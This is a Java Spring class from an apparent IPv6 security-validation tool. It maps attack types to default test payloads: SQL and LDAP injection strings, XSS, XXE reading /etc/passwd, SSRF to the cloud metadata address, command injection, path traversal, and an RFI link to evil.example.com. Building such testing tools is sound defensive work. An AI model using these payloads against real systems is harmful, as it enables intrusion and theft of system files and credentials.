package io.veriguard.combination;

import java.util.Map;
import org.springframework.stereotype.Component;

/**
 * 基础攻击类型 → 默认 payload 模板 —— IPv6 安全验证系统 §3.6 ★2 PR D2.
 *
 * <p>PR D2 阶段先用内置默认 payload（足够给 generator 提供 base，演示 / 自测足够）；
 * PR D5 将改为从 §3.5 攻击用例库读取真实 payload.
 *
 * <p>未知 base_attack_type 走 fail-fast（不静默 fallback 空串）.
 */
@Component
public class BaseAttackPayloadCatalog {

  /** 内置默认 payload —— 覆盖 §3.5 attack_category 主要枚举值. */
  private static final Map<String, String> DEFAULTS =
      Map.ofEntries(
          Map.entry("sql_injection", "' OR '1'='1"),
          Map.entry("xss", "<script>alert(1)</script>"),
          Map.entry("xxe", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"),
          Map.entry("ssrf", "http://169.254.169.254/latest/meta-data/"),
          Map.entry("rce", "; cat /etc/passwd"),
          Map.entry("command_injection", "; cat /etc/passwd"),
          Map.entry("lfi", "../../../../etc/passwd"),
          Map.entry("rfi", "http://evil.example.com/shell.txt"),
          Map.entry("path_traversal", "../../../../etc/passwd"),
          Map.entry("csrf", "<form action=\"/admin\" method=\"POST\"></form>"),
          Map.entry("open_redirect", "https://evil.example.com"),
          Map.entry("ssti", "{{7*7}}"),
          Map.entry("nosql_injection", "{\"$ne\": null}"),
          Map.entry("ldap_injection", "*)(uid=*))(|(uid=*"),
          Map.entry("xpath_injection", "' or '1'='1"),
          Map.entry("crlf_injection", "test\\r\\nSet-Cookie: hijacked=true"),
          Map.entry("http_smuggling", "Content-Length: 4\\r\\nTransfer-Encoding: chunked"),
          Map.entry("deserialization", "rO0ABXNyAA=="),
          Map.entry("file_upload", "shell.php"),
          Map.entry("auth_bypass", "admin' --"),
          Map.entry("brute_force", "admin:password"));

  /**
   * @param baseAttackType §3.5 attack_category 枚举字符串
   * @return 默认 payload；未知类型抛 {@link IllegalArgumentException}（fail-fast）
   */
  public String defaultPayloadFor(String baseAttackType) {
    if (baseAttackType == null || baseAttackType.isBlank()) {
      throw new IllegalArgumentException("baseAttackType must not be blank");
    }
    String payload = DEFAULTS.get(baseAttackType);
    if (payload == null) {
      throw new IllegalArgumentException(
          "Unknown base_attack_type: '"
              + baseAttackType
              + "'. Known: "
              + DEFAULTS.keySet());
    }
    return payload;
  }

  /** 用于测试 / 校验. */
  public boolean isKnown(String baseAttackType) {
    return baseAttackType != null && DEFAULTS.containsKey(baseAttackType);
  }
}
